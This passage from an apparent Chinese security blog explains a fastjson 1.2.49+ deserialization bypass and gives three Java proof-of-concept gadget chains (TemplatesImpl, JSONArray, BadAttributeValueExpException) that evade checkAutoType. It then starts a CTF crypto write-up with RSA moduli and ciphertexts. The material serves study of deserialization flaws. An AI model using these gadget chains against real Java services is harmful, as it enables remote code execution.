field=badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException, jsonArray);<br>        String ser=serialize(badAttributeValueExpException);<br>        unserialize(ser);<br></code></pre></td></tr></table></figure><h1 id="fastjson-1-2-49"><a href="#fastjson-1-2-49" class="headerlink" title="fastjson 1.2.49"></a>fastjson 1.2.49</h1><p>从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法，在其<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p>为了解决这个问题，首先我们就需要看看什么情况下不会调用resolveClass，在java.io.ObjectInputStream#readObject0调用中，会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">byte</span> tc;<br>    <span class="hljs-keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;<br>        bin.readByte();<br>        handleReset();<br>    &#125;<br><br>    depth++;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">switch</span> (tc) &#123;<br>            <span class="hljs-keyword">case</span> TC_NULL:<br>                <span class="hljs-keyword">return</span> readNull();<br><br>            <span class="hljs-keyword">case</span> TC_REFERENCE:<br>                <span class="hljs-keyword">return</span> readHandle(unshared);<br><br>            <span class="hljs-keyword">case</span> TC_CLASS:<br>                <span class="hljs-keyword">return</span> readClass(unshared);<br><br>            <span class="hljs-keyword">case</span> TC_CLASSDESC:<br>            <span class="hljs-keyword">case</span> TC_PROXYCLASSDESC:<br>                <span class="hljs-keyword">return</span> readClassDesc(unshared);<br><br>            <span class="hljs-keyword">case</span> TC_STRING:<br>            <span class="hljs-keyword">case</span> TC_LONGSTRING:<br>                <span class="hljs-keyword">return</span> checkResolve(readString(unshared));<br><br>            <span class="hljs-keyword">case</span> TC_ARRAY:<br>                <span class="hljs-keyword">return</span> checkResolve(readArray(unshared));<br><br>            <span class="hljs-keyword">case</span> TC_ENUM:<br>                <span class="hljs-keyword">return</span> checkResolve(readEnum(unshared));<br><br>            <span class="hljs-keyword">case</span> TC_OBJECT:<br>                <span class="hljs-keyword">return</span> checkResolve(readOrdinaryObject(unshared));<br><br>            <span class="hljs-keyword">case</span> TC_EXCEPTION:<br>                <span class="hljs-type">IOException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> readFatalException();<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WriteAbortedException</span>(<span class="hljs-string">&quot;writing aborted&quot;</span>, ex);<br><br>            <span class="hljs-keyword">case</span> TC_BLOCKDATA:<br>            <span class="hljs-keyword">case</span> TC_BLOCKDATALONG:<br>                <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                    bin.setBlockDataMode(<span class="hljs-literal">true</span>);<br>                    bin.peek();             <span class="hljs-comment">// force header read</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<br>                        bin.currentBlockRemaining());<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                        <span class="hljs-string">&quot;unexpected block data&quot;</span>);<br>                &#125;<br><br>            <span class="hljs-keyword">case</span> TC_ENDBLOCKDATA:<br>                <span class="hljs-keyword">if</span> (oldMode) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptionalDataException</span>(<span class="hljs-literal">true</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                        <span class="hljs-string">&quot;unexpected end of block data&quot;</span>);<br>                &#125;<br><br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamCorruptedException</span>(<br>                    String.format(<span class="hljs-string">&quot;invalid type code: %02X&quot;</span>, tc));<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        depth--;<br>        bin.setBlockDataMode(oldMode);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当为引用类型时不会触发</p><h2 id="如何成为引用类型？"><a href="#如何成为引用类型？" class="headerlink" title="如何成为引用类型？"></a><strong>如何成为引用类型？</strong></h2><p>那么如何在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，让我们的恶意类<strong>成为引用类型</strong>从而绕过resolveClass的检查？</p><p>答案是当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，两个相同的对象在同一个反序列化的过程中只会被反序列化一次。那么我们可以在序列化的时候注入两个相同的 <code>TemplatesImpl</code> 对象，第二个 <code>TemplatesImpl</code> 对象被封装到 <code>JSONArray</code> 中。那么在反序列化我们的 <code>payload</code> 时，如果先用正常的 <code>ObjectInputStream</code> 反序列化了第一个 <code>TemplatesImpl</code> 对象，那么在第二次在 <code>JSONArray.readObject()</code> 中，就不会再用 <code>SecureObjectInputStream</code> 来反序列化这个相同的 <code>TemplatesImpl</code> 对象了，就会绕过<code>checkAutoType()</code>的检查！</p><h2 id="poc1-1"><a href="#poc1-1" class="headerlink" title="poc1"></a>poc1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//生成一个templates，加载恶意类字节码</span><br><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(calc.class.getName()).toBytecode();<br><span class="hljs-type">Templates</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> (Templates) getTemplates(bytes);<br><br><span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>jsonArray.add(templates);<br><br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>setValue(exception, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br><span class="hljs-comment">//List绕过</span><br>ArrayList&lt;Object&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>arrayList.add(templates);<br>arrayList.add(exception);<br><span class="hljs-comment">//序列化，反序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> serialize(arrayList);<br>unserialize(ser);<br></code></pre></td></tr></table></figure><h2 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//生成一个templates，加载恶意类字节码</span><br><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(calc.class.getName()).toBytecode();<br><span class="hljs-type">Templates</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> (Templates) getTemplates(bytes);<br><br><span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>jsonArray.add(templates);<br><br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>setValue(exception, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>map.put(templates, exception);<br><span class="hljs-comment">//序列化，反序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> serialize(map);<br>unserialize(ser);<br></code></pre></td></tr></table></figure><h2 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//生成一个templates，加载恶意类字节码</span><br><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(calc.class.getName()).toBytecode();<br><span class="hljs-type">Templates</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> (Templates) getTemplates(bytes);<br><br><span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>jsonArray.add(templates);<br><br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>setValue(exception, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br><span class="hljs-comment">//Set绕过</span><br><span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>set.add(templates);<br>set.add(exception);<br><span class="hljs-comment">//序列化，反序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> serialize(set);<br>unserialize(ser);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF2025</title>
    <link href="/2025/04/13/TGCTF2025/"/>
    <url>/2025/04/13/TGCTF2025/</url>
    
    <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="mm不躲猫猫"><a href="#mm不躲猫猫" class="headerlink" title="mm不躲猫猫"></a><strong>mm不躲猫猫</strong></h3><p>题目给出了一个txt文件</p><p><img src="/./../img/TGCTF/Cry/1.png"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">题目中e=<span class="hljs-number">65537</span>，给出了多组<span class="hljs-built_in">n</span>和c，此时我们就可以尝试公因数攻击，对所有<span class="hljs-built_in">n</span>进行两两对比看看有没有公因数，如果发现公因数就可以顺势解出明文，python脚本如下：<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs python">n0 = <span class="hljs-number">104620414822063385079326749509982471870030893600285414264987224935916290272601764523383209465433613538037960991762459760833469310204135961581840403511596166088644211015428546275493892988418626726155859624501730928694822384537353845736516967991087412959351952563730377463899768183476698424362423043497737906623</span><br>c0 = <span class="hljs-number">46039211893589761388229614285558239355119695176816949068907191054207506730440947101388028710988726734999719468830467682553990941948390688315715650976965231516653707125993971747796355564587123089802425266994022342763366946693028597366959030863496254672081216842747104144465753908738135854355761032614829767801</span><br><br>n1 = <span class="hljs-number">136155385285881847647215965185525314111620437662648298206297512719879362719618304990758477078778565820295983050789197481446196249495631490160624235332536575107813683782766081951446123450465630897720159758797590205308439297488584076508093180968162324630134629769513496515404803402321721368832460090329222421827</span><br>c1 = <span class="hljs-number">89662183394841207920629365819797260101947925700835102302177181731227878954957449881945530912024549859105187175733895858270028583699811542603429941425305090712263572930206869292032730915960185806373681528825761306228562959997158901987273897776177362099560025615451752245984242926480186459915665627188585304468</span><br><br>n2 = <span class="hljs-number">97838166150880996322271330309067876274369629304288765249967974468367105054047299499596040632925907384502862419004673114223665726506104837885822909371569060745589002030380969587694083056125880529762088534900418072441378759571612290245967363366712440121861026216057485493561216431656619679041625036650956580141</span><br>c2 = <span class="hljs-number">13964437454524296084510225903229161859257123876632697866040207708487126396198332364645709267606449694929792345209792570053510791963531448336253575726210469465864539890677252499866753713612441273667882500168058017224495736582505959700480874460389262074140652815959688469055699161959913579169401470659235115109</span><br><br>n3 = <span class="hljs-number">104414012452710814870605097680598206512628379244374492767447479240624513395489881648267796649097204325681020437139111489809239200240891543325545119842310141868094306405364856531235723882286394670951990820247279699581908662322090700977209258378235724854303512782381876653582770637338146610370083320542016205683</span><br>c3 = <span class="hljs-number">82881158840663752381301293012156412156837667139486617975885122294931414239233800584880788452785824426565433162837294264882670497672373640661237256739513251217169843502230708215107997955489103032973333421550906077697455003620266617859876793492495921562432213017574083204710327670808824909752320056069246239174</span><br><br>n4 = <span class="hljs-number">99823327577152655919881942955430441203405862718412557750434832628874011564431142403116162320302719502032615315370431727445122354675365173475960959108842673705131185515432235779337198687430269502043589489978848478071330885198888066287011818540897074331277424039757182998605121722943855660357645805326677153717</span><br>c4 = <span class="hljs-number">64138140240395665924604130130703540113256964046054792668268574048575684146042187358538769647646826411085147480827784068745180715064157256643530984132712374746041235071459578557497303083281429793485934099219969514633245125822049070217273545487615694689955426204739083406630834370776842330036968574339849312190</span><br><br>n5 = <span class="hljs-number">90248365015461553299898947837419575685297696972462936965177693228158751120540052910252324465443891464072089492969551376378871872695721660747109548018879225735392583821723157787309278187199003459586595097068752600095247478763948136028872918472784517794186246938117176464805239704409618972143063753329505566853</span><br>c5 = <span class="hljs-number">1223888729370280608766408497925046298425450348475284427245593721486677451374468326993646894433196784805828316395498508329520722177308210723319637874241965908787713633812806440948367216379440947308444484034237493420426695742994319947973787416278207394357344618722581642427663321180647265844445386795487560858</span><br><br>n6 = <span class="hljs-number">94301600004957404266556049084426784947851528267810628496480180851237620577304221709916982386576998311327072033147184826449394769608326104893954128903966864163663992266019244394627758978231671671541415036785806102418923157988170641749789081578513122682013855878981445323502941212687339286209950916049829329187</span><br>c6 = <span class="hljs-number">82863658163999555104982625957574084596896562517734036934606118180244186596013418259858429681535345561639916993457165170775791581510308180862345406598823456939294419306667134634269429977644283692866602683240830596570130273545693685907124378153685099119789311788059184914707444767893674300246508953649015681088</span><br><br>n7 = <span class="hljs-number">138170846301125942544269528744423947570529693718702890060589562072507810299909374867578243513284575250911481367534521588818327369799372617013333797662648828094081675473684406506957984907476220469711444738611866548585674505249902648164090122673746393223709022870555269699592064314818239962909612890442312536933</span><br>c7 = <span class="hljs-number">119491008614166618841992196881667810795520664399142702036770629613897435080974181361028261908409801454926881075401108841568189702203622458656829859177063551730844676750575953975812052429747999704001795514743286102185049083720492556614745899457272537611852473621247097119159488258837994164495342656615476302293</span><br><br>n8 = <span class="hljs-number">99901179729466406997922350743173808335015436647254619150427257167185543967050112627966407293196288285044671444967319335613534165252968178742796010193662584739560998687124865190606432448575536720824666312791430118010828122012890994586807518564096074794014835645108286554069368202103540075137356780856603244771</span><br>c8 = <span class="hljs-number">40949907108391333609720915101613553123371146309830061575032335884884685212781529054807943471531015409944714724754037484012671956839250763388297109533737287622070764203904098500668030151150924717345985380483608467246475689588355409720763724390243856239025656921590604001847453755775742556441416378253225782045</span><br><br>n9 = <span class="hljs-number">61259690030437494665426739847257152273395280130837116404942961022205772370190262747451577687684105785729566638453953643821737649627970942826417199458528269898125881584665758246625505537450238486870409634480317106977874179837348319750569863206089421857959928948968490914332458264088528882363587362546115476251</span><br>c9 = <span class="hljs-number">10692583709802517287930376649896453621521035451564315558444774153067965107653136923487082233843270601808293644966170765029706088111741391700718327393258142617729248507339361448214949280176995019279632751180066719588055722391265746855172906890300921322899541689661567468774910639893953734407333686955281968991</span><br><br>n10 = <span class="hljs-number">61801039992828445962366192979879213579034618929625634137120257905363978638538524619375061476757245266904915273416909418840046887399433511888387463824393594567840703853932743962712886373493942192676347226424517033517271152629683484135645803084066312864114637935053614714648933122150287993866439987611541220969</span><br>c10 = <span class="hljs-number">10954274353991105637557727664545210588822691288407080879449837043794604324870247005437716228395288744012991388616203129640408571481134055220861654888292000079401922754349164416070902140135750687970710746596746307040822491545884725291812622162525094521528191986864571199953770504742086093754298024706688942928</span><br><br>n11 = <span class="hljs-number">81076578036433170079082060836251685409287159446492965753296193307212279343201967736475565889190946261084018661195513222887762729102719817463298142435098272288250455906191971306724773977704843489656384202130835772028461187750372122197493270556005946889088028901632597942947850025951446511574872271538279172293</span><br>c11 = <span class="hljs-number">28588867978892890299123101792867355705290435712099342525411465487097050420749940637639374841366314897499067089478542918061978965078760947752781916587927764087734267821483523703898120835527780177065213641081291514925902487762337571992584303375758239828857480300529159002038173766923215063406196287270281994110</span><br><br>n12 = <span class="hljs-number">71157530232168231071136890858912616050720830400022706299714461019258910354851417650227422961886365022306141477702824881599077623195801641964057263386031786220270890082089447766654209469387927987335260990984685945401925861903655650392938594865200916004709406149687172952181674325358107989641197765842163904547</span><br>c12 = <span class="hljs-number">27960181215930944825487403120483445285549624807444954861078101716612013743479552799262420582301067324579888715200194831185242773332005168956859526124595540207082642989519872446505766401363375766517640847713946346877947806553907090624698961288800133781997732503324975289915749170584907965906576569454791362716</span><br><br>n13 = <span class="hljs-number">66972648047375401600966868890460223407049464787687477233543254745626282151414582703711121179221058247651761267900898225903976203880613931632194874983043030539016993590676102349957616653491527988171250828064867642424963623959132504648424440781640680504700708119332029568543096316060268809505043468916214805513</span><br>c13 = <span class="hljs-number">60835135959791008690787814428104042871068368305340120883899568388232284733018967302193949855079169482639685706640962794034354074444182486368506005576035610719914663064491492453959532118366777810500578191258738886381059084295580203383314309232955684615288245065267787325644339730306113924643772851852254974447</span><br><br>n14 = <span class="hljs-number">90257637943598108316769497507794508593198806302392993521070418011991721766720752879485768447222083665431446115452523069625768629087198843486179127627688891514510660821010755020225100968675551771499095646313769726939397657740949967858530715457699721915837776214979058584769812249030196060963967766503952342313</span><br>c14 = <span class="hljs-number">4399313549134622905685042154653087546829550910787423655419326566487878138253206359509288756495066332688825657315393329979416459694050238332939436214209529989902054986831591699570809096389539557895185915401991616918262699503508747929872338216502127614214065785380825327547608094369072262475865753199634917243</span><br><br>n15 = <span class="hljs-number">92288251740600331464419220550566043483318956046633993383068422751131440697160804724009965543419750026416145402171946239689160353343558812650051732083425661211116525981882827129786285507421384186253914385945235839575942689159175143843170584595031563834194522396791461112821621800304795101789634774174454963923</span><br>c15 = <span class="hljs-number">66247987728121195021048077968716090081849970921058095317354141115909675926873116470141983756969079542376202625155266240762945918052265405682130314708469394971687236301195491947843935012259628382158162193578005325779969088722810703761417697325724612365005066194053189048901730077756974814700579148238309842127</span><br><br>n16 = <span class="hljs-number">69827077115568693338658530875808427671954833979587031673719819999982837118678966004630045025949355988108488971089469456573587826096181206180504021005589295303686058202337425160037577216512544874916659317879664486251344000204924121435478175340685277219630619759748397121310072824905427346314024289371793912511</span><br>c16 = <span class="hljs-number">41961541529750170616647278321641897011519854170766331727250048812589068480312085578768151129262884426947065380762103627693081345115074811616528854812168141383304088815422297153742050890507255438405990962029560578841792672129077703992563889849131151026125890119428775426873159430059036108088873321237025365358</span><br><br>n17 = <span class="hljs-number">121967509067813105411086531144570873813192438551353178244135305741941444885017879430265551135740001199881109528100015326618038641360496483748825955036785972103400120249819219515635771224670126658284122783204302878023875811221532401827466979985960758004984121521325952830430974045801555031712045538716943996723</span><br>c17 = <span class="hljs-number">56685268855458449301807361992185903395597392151912521111631437180065784801852096532529914802338195640469288263142147157273947747638162749552053228362964253085471152499570837646190222747929748096979121775764723331627546226024083599380351478409656463017930399581089017887517605437054166812501653272994305049733</span><br><br>n18 = <span class="hljs-number">111443052209737188054980912596162706015139783786609288606533946708676690565398361227327894393619361319986987105479808487817585338876690712274387199821822463901215385473552030769905055879411818185403467682658270584733008692794033574579656016628470672448456704070463193623651351708851493606658113454562567882661</span><br>c18 = <span class="hljs-number">43063936534303512947747167344506435082446824926097920117523394928030369927880018399419359991527162493235267016416838487018780946144446357441103107132169534930859416679537307845573892372204094363648842008627025957417743819712548780548638411753631418121273062911493469263026439608376883943145341779233547349322</span><br><br>n19 = <span class="hljs-number">95620970653115821773446688521489956525828853169640893473222967682133652620358237668549573949380199526055232887654104696571224326591336762618919861506923955551797033258152132330235021156256598798132150199923133163071780984430617120833384712466833259138293611424196294549754790929522798073754475302543066810743</span><br>c19 = <span class="hljs-number">91169514280852748423033050397827518019817961586213917174038858129257009995113093470448250725086280286170678089050234174099511369579341419962038031802624545869067250826450322548758429711203364340708549417927947792532084430609434623786029296423816717020689535357554451463107098397308992129847312441034090896054</span><br><br>n20 = <span class="hljs-number">124459121435252896777500422250770572324857852710447484525638245458046469810759653904386808397836485937480907526066675846846520234694216388767247413055775273377784217457842271722405085516541895286181193855041203802309799146536571497448784444626120767476230109922946020087790478941065170405108420502950780133523</span><br>c20 = <span class="hljs-number">31093240913979248685149171690112008628787979057692479889383006812352691515320164771142647979614495403955948954659560787370320141750652034536411365349410185683329265665259057268279825368747472043471647395698722820688715744644164047773730191101752121825958698066913241659826405486783122723635730561796940158209</span><br><br>n21 = <span class="hljs-number">81003649135399280604842700104760993194465757071677051471315130409609378910142544915378149900405963802123740729794683591795243782387944402010717523706170293193013567657184591547272086787248471917203180979462232769467918763279576984067235329340647626314893413320227300379671225813004347947887556793324907475161</span><br>c21 = <span class="hljs-number">44574763638238888886413256782673998315683494885040898927663006383199262443563576364203866155221980255226080343413308265988173997445413293009039817487501278047992287533365144990492783676929885753160063328137593489873818942984326464370764083819180424063003855862513091163320610019844965347283565770209660580060</span><br><br>n22 = <span class="hljs-number">98732243816208344101089881999678229767787321192638126987232060022293171828538636055234082960150558855412662397028478679139916381771811220331027455874138797444723547224197063212061534351867173190141857439152581327894215440861514666659083641573712750230406234166746981657633453579555223087777388017141219863357</span><br>c22 = <span class="hljs-number">79986503981752061258794042676693178586447029502359747048023111795992934365242244682829429272390068037057046062309761327773405090718654650720076028550805109733579396054684907361299816676563364626187567013130090336496213340846195056940882865823569179892482289906651517251337945983544365258393137860454629191034</span><br><br>n23 = <span class="hljs-number">66758615137661898183681497955843604169028345085237805715333905865679489166485605837900352165193227372176156053590485930024553737196112154396746107966369020635666402637798447666072855759885530955274895416566724028133310359697187795915845310925062676192985370829461872593411469634758531178728570607504146151183</span><br>c23 = <span class="hljs-number">13644517609019773891752530242094138831866235873125487109230786665109164395091721313937951226156892649251285129063094039490320017705224680296595835191486830050938538995037990589408100435630167986445442337761819350654576053224334692633242984280988119041485629348514778490701297689672789712907641785978089412539</span><br><br>n24 = <span 